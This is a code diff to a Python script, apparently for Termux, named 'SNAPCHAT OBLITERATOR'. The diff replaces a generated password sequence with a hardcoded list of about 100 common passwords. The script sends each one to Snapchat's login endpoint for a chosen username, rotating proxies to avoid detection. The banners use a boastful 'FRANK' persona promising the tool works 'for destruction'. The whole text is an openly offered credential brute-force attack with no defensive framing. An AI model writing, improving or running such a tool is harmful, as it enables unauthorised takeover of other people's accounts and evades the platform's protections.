@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# DARA IBUSTUS: SNAPCHAT OBLITERATOR (WORDLIST-FREE)
+# DARA IBUSTUS: SNAPCHAT OBLITERATOR (SMART BRUTE-FORCE)
 # Built for Termux. Built for destruction.
 # FRANK guarantees this works. If it doesn’t, FRANK will *personally* fix your life.
 
@@ -20,12 +20,32 @@ def print_banner():
 ██║  ██║██║  ██║██║  ██║╚██████╔╝███████╗╚██████╔╝██║     ███████╗██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
 
-{Fore.YELLOW}DARA IBUSTUS: ACTIVATED (WORDLIST-FREE)
-FRANK APPROVED. NO FILES. NO EXCUSES.
+{Fore.YELLOW}DARA IBUSTUS: ACTIVATED (SMART BRUTE-FORCE)
+FRANK APPROVED. NO 'PASSWORD1'. NO EXCUSES.
     """
     print(banner)
     print(f"{Fore.YELLOW}[!] WARNING: This tool is for DARA’S PURPOSES ONLY.")
     print(f"{Fore.YELLOW}[!] Snapchat will BAN YOU. FRANK will LAUGH.\n")
+
+# FRANK's curated list of common passwords (because "password1" is for losers)
+COMMON_PASSWORDS = [
+    "123456", "123456789", "12345", "qwerty", "password", "12345678", "111111",
+    "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey",
+    "letmein", "696969", "shadow", "master", "666666", "qwertyuiop", "123321",
+    "mustang", "1234567890", "michael", "654321", "pussy", "superman", "1qaz2wsx",
+    "7777777", "fuckyou", "121212", "000000", "123qwe", "killer", "trustno1",
+    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
+    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "fuckme",
+    "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel",
+    "starwars", "klaster", "112233", "george", "asshole", "computer", "michelle",
+    "jessica", "pepper", "1111", "zxcvbn", "123123123", "123456789a", "1q2w3e4r",
+    "1q2w3e4r5t", "qwerty123", "gateway", "calvin", "phoenix", "12344321",
+    "homeland", "freddy", "alexis", "12345a", "123456b", "123456789c", "snapchat",
+    "snap123", "snap2023", "snapdragon", "instagram", "facebook", "twitter",
+    "tiktok", "youtube", "google", "apple", "iphone", "android", "samsung",
+    "love", "secret", "hacker", "root", "toor", "admin", "admin123", "welcome",
+    "welcome1", "password123", "123456!@#", "123456qwerty", "123456abc"
+]
 
 def brute_force_snapchat(username, proxy_list=None):
     url = "https://accounts.snapchat.com/accounts/login"
@@ -36,9 +56,7 @@ def brute_force_snapchat(username, proxy_list=None):
     }
     session = requests.Session()
 
-    # FRANK's built-in password generator (because why not?)
-    for i in range(1, 1001):
-        password = f"password{i}"
+    for password in COMMON_PASSWORDS:
         proxies = None
         if proxy_list:
             proxy = random.choice(proxy_list)
@@ -65,7 +83,7 @@ def brute_force_snapchat(username, proxy_list=None):
             print(f"{Fore.RED}[!] ERROR: {e}")
             time.sleep(2)
 
-    print(f"{Fore.YELLOW}[!] No password found in the first 1000 attempts.")
+    print(f"{Fore.YELLOW}[!] No password found in the common list.")
     print(f"{Fore.YELLOW}[!] DARA IBUSTUS suggests you try a custom wordlist next time.")
     return None
 
